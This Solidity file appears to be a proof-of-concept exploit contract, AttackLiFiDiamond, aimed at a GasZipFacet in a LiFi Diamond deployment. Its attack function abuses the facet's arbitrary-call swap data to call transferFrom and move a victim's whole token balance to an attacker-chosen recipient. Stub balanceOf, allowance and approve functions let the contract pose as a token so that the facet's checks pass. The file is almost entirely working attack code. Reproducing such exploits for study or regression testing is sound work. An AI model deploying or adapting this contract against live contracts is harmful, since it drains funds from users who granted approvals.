// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {GasZipFacet, LibSwap} from "../../src/GasZipFacet/Facets/GasZipFacet.sol";

contract AttackLiFiDiamond {
    function attack(
        address _diamond,
        address _token,
        address _from,
        address _recipient
    ) external payable {
        LibSwap.SwapData memory _swapData;
        _swapData.callTo = address(_token);
        _swapData.fromAmount = 1;
        _swapData.sendingAssetId = address(this);
        _swapData.approveTo = address(this);
        _swapData.callData = abi.encodeCall(
            IERC20.transferFrom,
            (_from, _recipient, IERC20(_swapData.callTo).balanceOf(_from))
        );

        GasZipFacet(_diamond).depositToGasZipERC20(_swapData, 1, _recipient);
    }

    function balanceOf(address _account) external view returns (uint256) {
        return 2;
    }

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256) {
        return 0;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        if (amount != 0) {
            payable(msg.sender).call{value: 2}("");
        }

        return true;
    }
}
